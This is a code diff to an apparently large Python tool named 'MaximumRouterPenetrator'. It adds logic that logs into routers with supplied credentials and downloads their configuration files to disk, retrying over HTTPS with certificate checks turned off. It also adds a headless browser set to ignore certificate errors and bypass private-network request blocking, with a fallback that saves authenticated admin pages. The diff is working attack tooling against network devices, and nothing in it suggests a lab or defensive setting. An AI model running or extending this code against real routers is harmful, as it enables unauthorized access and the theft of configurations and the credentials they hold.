@@ -4433,11 +4433,52 @@ class MaximumRouterPenetrator:
                     req.add_header('Authorization', f'Basic {auth_b64}')
                     
                     response = urllib.request.urlopen(req, timeout=self.performance_config['timeouts']['connection'])
-                    content = response.read().decode('utf-8', errors='ignore')
+                    raw_content_bytes = response.read()
+                    content = raw_content_bytes.decode('utf-8', errors='ignore')
+
+                    # Detect stubby HTML redirectors and retry via HTTPS with auth
+                    is_html_stub = False
+                    lc = content.lower()
+                    if '<html' in lc and ('window.location' in lc or '<meta http-equiv="refresh"' in lc):
+                        is_html_stub = True
+                    if len(content) < 300 and '<html' in lc:
+                        is_html_stub = True
+
+                    if is_html_stub and REQUESTS_AVAILABLE:
+                        try:
+                            if verbose:
+                                print(f"         🔁 Stub HTML detected for {config_path}, retrying via HTTPS...")
+                            https_url = f"https://{ip}{config_path}"
+                            session = requests.Session()
+                            session.auth = credentials
+                            session.verify = False
+                            r = session.get(https_url, timeout=self.performance_config['timeouts']['connection'])
+                            if r.status_code == 200 and len(r.content) > 100:
+                                raw_content_bytes = r.content
+                                content = r.text
+                        except Exception:
+                            pass
                     
                     if response.getcode() == 200 and len(content) > 100:
+                        # Derive stable filename per IP and path
+                        safe_path = config_path.strip('/').replace('/', '__') or 'root'
+                        safe_filename = f"config_{ip}__{safe_path}"
+                        if not any(safe_filename.lower().endswith(e) for e in ['.xml', '.conf', '.cfg', '.bin', '.asp', '.cgi', '.txt']):
+                            safe_filename += '.txt'
+
+                        # Save full content to disk
+                        try:
+                            with open(safe_filename, 'wb') as f:
+                                f.write(raw_content_bytes)
+                            if verbose:
+                                print(f"         💾 Config file saved: {safe_filename}")
+                        except Exception as e:
+                            if verbose:
+                                print(f"         ❌ Config file save error: {str(e)[:50]}")
+
                         config_result['files'].append({
                             'path': config_path,
+                            'filename': safe_filename,
                             'size': len(content),
                             'content': content[:5000]  # First 5000 chars
                         })
@@ -4593,6 +4634,9 @@ class MaximumRouterPenetrator:
             chrome_options.add_argument('--disable-dev-shm-usage')
             chrome_options.add_argument('--disable-gpu')
             chrome_options.add_argument('--window-size=1920,1080')
+            chrome_options.add_argument('--ignore-certificate-errors')
+            chrome_options.add_argument('--allow-running-insecure-content')
+            chrome_options.add_argument('--disable-features=BlockInsecurePrivateNetworkRequests')
             
             # Create WebDriver
             driver = webdriver.Chrome(options=chrome_options)
@@ -4616,6 +4660,9 @@ class MaximumRouterPenetrator:
                     EC.presence_of_element_located((By.TAG_NAME, "body"))
                 )
                 
+                # Ensure screenshots directory exists
+                import os
+                os.makedirs('screenshots', exist_ok=True)
                 # Take screenshot
                 screenshot_path = f"screenshots/{filename}"
                 driver.save_screenshot(screenshot_path)
@@ -4633,6 +4680,24 @@ class MaximumRouterPenetrator:
             result['error'] = str(e)
             if verbose:
                 print(f"         ❌ Selenium screenshot error: {str(e)[:50]}")
+            # Fallback: save authenticated HTML with requests
+            try:
+                if REQUESTS_AVAILABLE:
+                    session = requests.Session()
+                    if credentials:
+                        session.auth = credentials
+                    session.verify = False
+                    r = session.get(f"http://{ip}{url}", timeout=10)
+                    if r.status_code in (200, 302, 301) and len(r.text) > 0:
+                        html_name = f"screenshots/{filename}.html"
+                        with open(html_name, 'w', encoding='utf-8') as f:
+                            f.write(r.text)
+                        result['success'] = True
+                        result['filename'] = html_name
+                        if verbose:
+                            print(f"         ✅ HTML fallback saved: {html_name}")
+            except Exception:
+                pass
         
         return result
     
